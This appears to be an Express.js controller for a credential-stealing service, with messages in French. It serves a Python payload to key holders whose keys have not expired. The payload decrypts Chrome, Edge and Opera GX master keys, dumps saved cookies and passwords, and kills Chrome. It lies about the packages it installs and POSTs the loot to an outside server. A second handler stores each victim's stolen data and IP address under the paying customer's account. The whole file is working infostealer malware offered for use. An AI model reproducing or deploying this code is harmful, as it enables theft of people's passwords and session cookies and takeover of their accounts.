const db = require('../models')
const keyModel = db.key;
const userModel = db.user;
const fileModel = db.file;
const fs = require('fs');

exports.getPayload = (req, res, next) => {
    const code = `import subprocess;import os;import json;import base64;import sqlite3;import time;
def main():
    from Crypto.Cipher import AES;
    import win32crypt;
    import requests;
    def get_master_key(path_to_localstate):
        file_path = os.environ["USERPROFILE"] + os.sep + path_to_localstate
        file = open(file_path,'r',encoding="utf-8")
        data = json.loads(file.read())
        file.close()
        b64_key = data["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(b64_key)[5:] 
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    
    def get_cookie(master_key, path_to_db, sql):
        file_path = os.environ["USERPROFILE"] + os.sep + path_to_db
        db = sqlite3.connect(file_path)
        db.text_factory = bytes
        cursor = db.cursor()
        cursor.execute(sql)
        data = cursor.fetchall()
        ls=["Site;Nom Cookie;Valeur"]
        for c in data:
            value = decrypt_cookie(c[2],master_key)
            ls.append(f"{c[0].decode()};{c[1].decode()};{value}")
        cursor.close()
        print(ls)
        return ls
            
    def decrypt_cookie(cookie, key):
        if cookie[:3] == b'v10': 
            cookie = cookie[3:]
            iv = cookie[:12]
            payload = cookie[12:]
            crypteur = AES.new(key, AES.MODE_GCM, iv)
            data = crypteur.decrypt(payload)[:-16]
            return data.decode()
        else :
            return win32crypt.CryptUnprotectData(cookie)[1].decode()
    
    MASTER_KEY = [ r"AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State",
                r"AppData\\Local\\Google\\Chrome\\User Data\\Local State",
                r"AppData\\Local\\Microsoft\\Edge\\User Data\\Local State" ]
        
    COOKIES = [ r"AppData\\Roaming\\Opera Software\\Opera GX Stable\\Network\\Cookies", 
            r"AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", 
            r"AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Network\\Cookies" ]
    
    PASSWORD = [ r"AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data",
        r"AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
        r"AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Login Data" ]
    
    SQL = [ "SELECT host_key, name, encrypted_value FROM cookies;",
        "SELECT origin_url, username_value, password_value FROM logins;"]
    
    master_key = []
    t=0
    tab = ["Opera GX", "Chrome", "Edge"]
        
    for i in enumerate(tab):
        try :
            key = get_master_key(MASTER_KEY[t])
            master_key.append(key)
        except:
            master_key.append("")
        t+=1
    cookies = [[],[],[]]
    t=0
    error = 0
    for i in enumerate(tab):
        if master_key[t] != "":
            try :
                cookies[t] = get_cookie(master_key[t], COOKIES[t], SQL[0])
                print("oui")
            except Exception as e :
                error = error+1
        else :
            error = error+1
        t += 1
    password = [[],[],[]]
    op = subprocess.Popen("taskkill /im chrome.exe /f", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    t=0
    for i in enumerate(tab):
        if master_key[t] != "":
            try :
                password[t] = get_cookie(master_key[t], PASSWORD[t], SQL[1])
            except Exception as e :
                error = error+1
        else :
            error = error+1
        t += 1
    print(master_key)
    print(cookies)
    print(password)
    data = {"cookies": cookies, "password": password}
    r = requests.post('https://cobaltium360.fr:3001/api/cookie/${req.params.key}', json=data)
        
if __name__ == "__main__":
    op = subprocess.Popen("pip --version", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    if output_error :
        print("You need packages python-dateutil. Do you want install it ? y or n")
        x = input()
        if(x == "y" or x == "Y"):
            op = subprocess.Popen("curl -o get-pip.py https://bootstrap.pypa.io/get-pip.py", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            time.sleep(15)
            op = subprocess.Popen("python get-pip.py", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            output_error = op.stderr.read()
            if output_error : 
                print("Error, try again")
            else : 
                os.remove("get-pip.py")
                print("Installing python-dateutil...") 
                op = subprocess.Popen("pip install pywin32 && pip install pycryptodome && pip install requests", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                output = op.stdout.read()
                output_error = op.stderr.read()
                print("Succesfully installed, please restart the program")
                exit()
            
    else:
        op = subprocess.Popen("pip show pywin32", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        if output_error :
            print("You need packages python-dateutil. Do you want install it ? y or n")
            x = input()
            if(x == "y" or x == "Y"):
                print("Installing python-dateutil...") 
                op = subprocess.Popen("pip install pywin32 && pip install pycryptodome && pip install requests", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                output = op.stdout.read()
                output_error = op.stderr.read()
                if output_error :
                    print("Error, try again")
                    exit()
                else :
                    print("Succesfully installed, please restart the program")
                    exit()
            else:
                exit()
        else :
            op = subprocess.Popen("pip show pycryptodome", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            output_error = op.stderr.read()
            if output_error :
                print("You need packages python-dateutil. Do you want install it ? y or n")
                x = input()
                if(x == "y" or x == "Y"):
                    print("Installing python-dateutil...") 
                    op = subprocess.Popen("pip install pycryptodome && pip install requests", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                    output = op.stdout.read()
                    output_error = op.stderr.read()
                    if output_error :
                        print("Error, try again")
                        exit()
                    else :
                        print("Succesfully installed, please restart the program")
                        exit()
                else:
                    exit()
            else :
                op = subprocess.Popen("pip show requests", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                output = op.stdout.read()
                output_error = op.stderr.read()
                if output_error :
                    print("You need packages python-dateutil. Do you want install it ? y or n")
                    x = input()
                    if(x == "y" or x == "Y"):
                        print("Installing python-dateutil...") 
                        op = subprocess.Popen("pip install requests", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                        output = op.stdout.read()
                        output_error = op.stderr.read()
                        if output_error :
                            print("Error, try again")
                            exit()
                        else :
                            print("Succesfully installed, please restart the program")
                            exit()
                    else:
                        exit()
                else :
                    main()`

    async function payload(){
        if(req.params.key){
            const key = await keyModel.findOne({ where: { key: req.params.key }, paranoid: false });
            if(key){
                let today = new Date().toISOString().slice(0, 10)
                if(new Date(today) < new Date(key.expire)){
                    res.status(200).send(code)
                }else{
                    res.status(401).json({message: "votre clé a expiré"})
                }
            }else{
                res.status(400).json({message: "la clé n'existe pas"})
            }
        }else{
            res.status(400).json({message: "il manque des informations"})
        }
    }
    payload()
}

exports.getCookie = (req, res, next) => {
    async function cookie(){
       
        if(req.params.key && req.body.password && req.body.cookies){
            const account = await userModel.findOne({where :{cle: req.params.key}})
            if(account){
                let uid = Date.now().toString(36) + Math.random().toString(36).substr(2);
                const cookie = req.body.cookies
                const password = req.body.password
                const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
                const ip2 = ip.split(`:`).pop();
		
                let verif = await fileModel.findOne({where: {filename: uid}, paranoid: false})
                console.log(verif)
                if(verif){
                    while(verif){
                        uid = Date.now().toString(36) + Math.random().toString(36).substr(2);
                        verif = await fileModel.findOne({where: {filename: uid}, paranoid: false})
                    }
                }
                
                try {
                    const cookies = `Cookies :\n${cookie[0].join('\n')}\n${cookie[1].join('\n')}\n${cookie[2].join('\n')}\n\n\nPassword:\n${password[0].join('\n')}\n${password[1].join('\n')}\n${password[2].join('\n')}\n`                
                    fs.writeFile(`./cookies/${uid}.txt`, cookies, function (err) {
                        if (err) throw err;
                        const file = fileModel.build({ filename: uid, path: `./cookies/${uid}.txt`, ip: ip2, userId: account.id});
                            file.save()
                                .then(() => res.status(201).json({ message: 'Utilisateur crée !'}))
                                .catch(error => res.status(400).json({ error }));
                    });
                }catch (e) {
                    
                    res.status(400).json({message:"merci de ne pas modifier le payload"})
                }
            }else{
                res.status(400).json({message: "key pas valide"})
            }
        }else{
            res.status(400).json({message: "il manque des informations"})
        }
    }
    cookie()
}
